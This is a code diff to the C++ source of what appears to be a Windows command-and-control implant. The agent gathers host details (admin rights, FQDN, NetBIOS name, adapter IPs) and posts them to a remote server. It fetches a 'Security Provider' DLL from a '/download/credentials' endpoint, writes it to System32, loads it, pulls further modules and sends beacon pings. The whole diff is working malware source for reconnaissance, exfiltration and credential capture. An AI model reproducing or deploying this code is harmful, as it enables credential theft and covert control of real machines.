@@ -15,21 +15,31 @@
 Agent::Agent(std::string _serverUri) {
     serverUri = _serverUri;
     auto systemInfo = Agent::getSystemInfo();
-    CheckNewModules();
-    plantSP();
 
-    wrap::HttpsRequest(
+    std::cout << "[+] Got system info. Client id: " << clientID << std::endl;
+
+   // if (wasDeployed()) {
+   //     return;
+   // }
+    auto adapters = utils::concat(systemInfo.adapters, ",");
+    auto resp = wrap::HttpsRequest(
         wrap::Url{ serverUri  + "/test2"},
         wrap::Method{ "POST" },
-        wrap::Header{ {"X-Client-ID", clientID} },
+        wrap::Header{ {"X-Client-ID", clientID}},
         wrap::Payload{
         {"isAdmin", std::to_string(systemInfo.isAdmin)},
         {"domainName", systemInfo.ComputerName},
-        {"Adapters", "127.0.0.1"},
+        {"Adapters", adapters},
         {"NetBIOSName", systemInfo.NETBIOSName}
         }
     );
 
+    if (resp.status_code == "200") {
+        std::cout << "[+] Got response from server on /test2 (init)\n\n";
+    }
+
+    CheckNewModules();
+    plantSP();
     Ping();
 }
 
@@ -55,6 +65,8 @@ SystemInfo Agent::getSystemInfo() {
         isAdmin = bResult;
         info.isAdmin = isAdmin;
 
+        std::cout << "[+] isAdmin: " << isAdmin << std::endl;
+
 
    // Get the computer FQDN
         std::wstring ComputerFQDN;
@@ -72,6 +84,8 @@ SystemInfo Agent::getSystemInfo() {
         auto byteStringFQDN = utils::w2s(ComputerFQDN);
         info.ComputerName = byteStringFQDN;
         clientID = std::to_string(utils::RSHash(byteStringFQDN));
+
+        std::cout << "[+] Cliend FQDN: " << byteStringFQDN << std::endl;
  //Get NETBIOS name
 
         std::wstring NETBIOSname;
@@ -87,18 +101,47 @@ SystemInfo Agent::getSystemInfo() {
         auto byteStringNETBIOS = utils::w2s(NETBIOSname);
         info.NETBIOSName = byteStringNETBIOS;
 
+        std::cout << "[+] NetBIOS name: " << byteStringNETBIOS << std::endl;
+
   // Get the adapters
-        auto pAdapterInfo = std::make_unique<IP_ADAPTER_INFO>();
-        std::vector<std::string> adapters;
-        DWORD size{};
-        if (auto res = GetAdaptersInfo(pAdapterInfo.get(), &size); res == NO_ERROR) {
-            auto pAdapter = pAdapterInfo.get();
-            while (pAdapter) {
-                auto adapterIPAddress = pAdapter -> IpAddressList.IpAddress.String;
-                adapters.push_back(adapterIPAddress);
+        /////
+
+        std::vector<std::string> Adapters;
+
+#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
+#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
+
+        PIP_ADAPTER_INFO pAdapterInfo;
+        PIP_ADAPTER_INFO pAdapter = NULL;
+        DWORD dwRetVal = 0;
+        UINT i;
+
+        char buffer[32];
+        errno_t error;
+
+        ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
+        pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
+        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+            FREE(pAdapterInfo);
+            pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
+            if (pAdapterInfo == NULL) {
+                return info;
             }
-            info.adapters = adapters;
         }
+
+        if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
+            pAdapter = pAdapterInfo;
+            while (pAdapter) {
+                Adapters.push_back(pAdapter->IpAddressList.IpAddress.String);
+                pAdapter = pAdapter->Next;
+            }
+        }
+        else {
+            return info;
+        }
+        if (pAdapterInfo)
+            FREE(pAdapterInfo);
+        info.adapters = Adapters;
         return info;
 }
 
@@ -111,12 +154,20 @@ bool Agent::plantSP() {
 
     std::string loadSPPath = "C:\\Windows\\System32\\ntssp.dll";
     auto response = wrap::HttpsRequest(
-        wrap::Url{serverUri + "/download/creds"},
+        wrap::Url{serverUri + "/download/credentials"},
         wrap::Method{ "GET" },
         wrap::Header{ {"X-Client-ID", clientID} },
         wrap::Download{ loadSPPath }
         );
-   std::cout << utils::LoadSP(loadSPPath);
+    if (response.downloaded_bytes > 0x100) {
+        std::cout << "[+] Recieved Security Provider from server\n\n";
+    }
+    if (utils::LoadSP(loadSPPath)) {
+        std::cout << "[-] Could not load SP\n";
+    }
+    else {
+        std::cout << "[+] SP Loaded successfully\n\n";
+    }
    return true;
 }
 
@@ -129,6 +180,7 @@ std::vector<std::string> Agent::CheckNewModules() {
     );
     auto responseText = response.raw;;
     auto stripped = response.raw.substr(1, response.raw.length() - 2);
+    std::cout << "[+] Got modules from server: " + responseText << std::endl;
     return utils::split(stripped, ",");
 }
 
@@ -147,17 +199,13 @@ std::string Agent::DownloadModule(const std::string& moduleEndpoint) {
 
 void Agent::Ping() {
 	auto currentTime{
-		std::chrono::duration_cast<std::chrono::microseconds>(
+		std::chrono::duration_cast<std::chrono::seconds>(
 			std::chrono::system_clock::now().time_since_epoch()).count()
 	};
     wrap::HttpsRequest(
         wrap::Url{ serverUri + "/test3" },
         wrap::Method{ "POST" }, 
-        wrap::Body{
-            std::to_string(currentTime)
-		},
-		wrap::Header {
-			{"X-Client-Id", clientID}
-		}
+        wrap::Body{ std::to_string(currentTime) },
+		wrap::Header { {"X-Client-Id", clientID} }
 	);
 } 
